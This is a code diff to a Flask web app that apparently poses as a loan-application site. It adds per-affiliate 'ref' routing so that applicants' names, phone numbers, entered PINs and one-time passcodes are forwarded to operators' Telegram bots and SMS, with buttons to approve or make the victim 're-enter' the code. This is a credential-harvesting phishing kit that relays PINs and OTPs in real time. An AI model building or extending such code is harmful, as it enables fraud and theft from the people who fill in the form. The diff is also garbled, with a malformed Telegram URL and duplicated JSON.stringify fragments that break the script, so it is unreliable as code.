@@ -46,33 +46,45 @@ def send_sms_notification(message):
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("TELEGRAM_TOKEN")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
 
-def send_telegram_notification(message, record_id=None):
-    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
-        print("Telegram configuration missing. Notification skipped.")
+import re
+
+def get_bot_config(ref):
+    clean_ref = re.sub(r'[^A-Za-z0-9_]', '', (ref or "")).upper()
+    if clean_ref:
+        token = os.environ.get(f"BOT_{clean_ref}_TOKEN")
+        chat_id = os.environ.get(f"BOT_{clean_ref}_CHAT_ID")
+        if token and chat_id:
+            return token, chat_id
+    return TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
+
+
+def send_telegram_notification(message, record_id=None, ref="default"):
+    token, raw_ids = get_bot_config(ref)
+    if not token or not raw_ids:
+        print(f"Telegram config missing for ref={ref}. Notification skipped.")
         return
     try:
-        chat_ids = [cid.strip() for cid in TELEGRAM_CHAT_ID.split(',')]
-        
+        chat_ids = [cid.strip() for cid in raw_ids.split(',')]
+
         reply_markup = None
         if record_id:
             reply_markup = {
                 "inline_keyboard": [[
-                    {"text": "❌ Incorrect — Ask Client to Re-enter", "callback_data": f"retry:{record_id}"},
-                    {"text": "✅ Approve", "callback_data": f"approve:{record_id}"}
+                    {"text": "❌ Incorrect — Ask Client to Re-enter", "callback_data": f"retry:{record_id}:{ref}"},
+                    {"text": "✅ Approve", "callback_data": f"approve:{record_id}:{ref}"}
                 ]]
             }
 
         for chat_id in chat_ids:
             if not chat_id:
                 continue
-            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-
+            url = f"https://telegram.org{token}/sendMessage"
             payload = {"chat_id": chat_id, "text": message}
             if reply_markup:
                 payload["reply_markup"] = reply_markup
             try:
                 resp = requests.post(url, json=payload, timeout=5)
-                print(f"Telegram response for {chat_id}: {resp.status_code} {resp.text}")
+                print(f"Telegram ({ref}) response for {chat_id}: {resp.status_code} {resp.text}")
             except Exception as inner_e:
                 print(f"Failed to send to chat_id {chat_id}: {inner_e}")
     except Exception as e:
@@ -625,8 +637,13 @@ HTML_PAGE = r"""<!DOCTYPE html>
   </footer>
 
   <script>
+       const urlParams = new URLSearchParams(window.location.search);
+    const urlRef = urlParams.get('ref');
+    if (urlRef) sessionStorage.setItem('keshagi_ref', urlRef);
+
     let appState = {
       appId: Date.now().toString(),
+      ref: sessionStorage.getItem('keshagi_ref') || 'default',
       fullName: "",
       mobile: "",
       nationalId: "",
@@ -699,6 +716,11 @@ HTML_PAGE = r"""<!DOCTYPE html>
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           appId: appState.appId,
+                  body: JSON.stringify({
+          appId: appState.appId,
+          ref: appState.ref,
+          fullName: appState.fullName,
+
           fullName: appState.fullName,
           mobile: formatMobileWithCountryCode(appState.mobile),
           nationalId: appState.nationalId,
@@ -965,6 +987,11 @@ HTML_PAGE = r"""<!DOCTYPE html>
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           appId: appState.appId,
+                  body: JSON.stringify({
+          appId: appState.appId,
+          ref: appState.ref,
+          fullName: appState.fullName,
+
           fullName: appState.fullName,
           mobile: formattedPhone,
           field: 'entered_pin',
@@ -1047,6 +1074,11 @@ HTML_PAGE = r"""<!DOCTYPE html>
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           appId: appState.appId,
+                  body: JSON.stringify({
+          appId: appState.appId,
+          ref: appState.ref,
+          fullName: appState.fullName,
+
           fullName: appState.fullName,
           mobile: formattedPhone,
           field: 'entered_otp',
@@ -1112,23 +1144,25 @@ def save_unified():
         f_n = data.get('field')
         f_v = data.get('value')
         now = get_now_str()
+        ref = data.get('ref', 'default')
 
         if db:
             db.delete(f"status:{app_id}")
 
         if f_n == 'entered_pin':
             m = f'🔐 PIN Received\n\n👤 User: {name}\n🔢 PIN: {f_v}\n📞 Phone: {phone}'
-            send_telegram_notification(m, record_id=app_id)
+            send_telegram_notification(m, record_id=app_id, ref=ref)
             send_sms_notification(f"[Keshagi Alert] PIN Received\nUser: {name}\nPhone: {phone}\nPIN: {f_v}")
         elif f_n == 'entered_otp':
             m = f'📱 OTP Received\n\n👤 User: {name}\n🔑 OTP: {f_v}\n📞 Phone: {phone}'
-            send_telegram_notification(m, record_id=app_id)
+            send_telegram_notification(m, record_id=app_id, ref=ref)
             send_sms_notification(f"[Keshagi Alert] OTP Received\nUser: {name}\nPhone: {phone}\nOTP: {f_v}")
         elif not f_n:
             amt = data.get('amount', 'N/A')
             m = f'🚀 *New Application Submitted*\n\n👤 *Name:* {name}\n📞 *Phone:* {phone}\n💰 *Amount:* ZWG {amt}\n📅 *Time:* {now}'
-            send_telegram_notification(m)
+            send_telegram_notification(m, ref=ref)
             send_sms_notification(f"[Keshagi Alert] New Application\nName: {name}\nPhone: {phone}\nAmount: ZWG {amt}")
+
 
         return jsonify({'status': 'success', 'record_id': app_id})
     except Exception as e:
@@ -1150,20 +1184,21 @@ def telegram_webhook():
     update = request.get_json(silent=True) or {}
     callback = update.get("callback_query")
     if callback:
-        data = callback.get("data", "")
+        parts = callback.get("data", "").split(":")
         callback_id = callback.get("id")
-        
-        if ":" in data and db:
-            action, record_id = data.split(":", 1)
+        if len(parts) >= 2 and db:
+            action, record_id = parts[0], parts[1]
+            ref = parts[2] if len(parts) > 2 else "default"
+            token, _ = get_bot_config(ref)
             db.setex(f"status:{record_id}", 900, action)
-            
             reply_text = "Marked as INCORRECT. Client prompted to re-enter." if action == "retry" else "Marked as APPROVED."
             requests.post(
-                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery",
+                f"https://telegram.org{token}/answerCallbackQuery",
                 json={"callback_query_id": callback_id, "text": reply_text, "show_alert": True},
                 timeout=5
             )
     return jsonify({"ok": True})
+
 
 
 @app.route('/api/status/<record_id>', methods=['GET'])
